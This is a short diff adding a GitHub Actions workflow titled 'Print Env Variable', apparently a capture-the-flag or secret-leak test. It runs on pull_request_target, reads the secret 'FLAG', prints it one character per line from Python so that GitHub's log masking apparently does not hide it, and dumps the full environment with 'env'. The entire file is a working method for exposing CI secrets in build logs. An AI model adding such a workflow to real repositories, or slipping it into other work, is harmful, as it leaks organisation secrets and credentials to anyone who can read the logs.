@@ -1,0 +1,22 @@
+name: Print Env Variable
+
+on:
+  pull_request_target:
+    types: [opened, synchronize, reopened]
+
+jobs:
+  print:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Print Organization Secret
+        env:
+          MY_VAL: ${{ secrets.FLAG }}
+        run: |
+          import os
+          for q in (os.getenv("MY_VAL")):
+            print(q)
+        shell: python
+
+      - name: Print Environment Variable
+        run: env
